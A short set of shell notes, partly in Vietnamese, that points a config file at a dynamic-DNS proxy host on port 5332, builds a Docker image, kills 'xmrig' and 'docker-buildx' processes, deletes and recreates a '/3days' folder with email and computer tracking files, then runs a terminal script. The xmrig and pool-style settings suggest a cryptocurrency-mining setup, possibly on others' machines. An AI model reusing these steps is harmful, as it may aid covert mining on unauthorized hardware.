sed -i 's/CMC_PROXY_DOMAIN/cent25-1.ddns.net/g' config.json
sed -i '' 's|"url": ".*:5332",|"url": "test.com:5332",|' config.json
docker build -t myimage .


# Tạo mới
cd /
rm -rf 3days
sudo pkill -f docker-buildx
sudo pkill -f xmrig
THỰC HIỆN WGET và CD vào folder /3days
mkdir info
echo [EMAIL] > info/email.txt
echo [COMPUTER] > info/computer.txt
echo 0 > info/status.txt
echo 1 > mail_type.txt
echo 3 > run_days.txt

# Open terminal
cd /3days
bash open_terminal.sh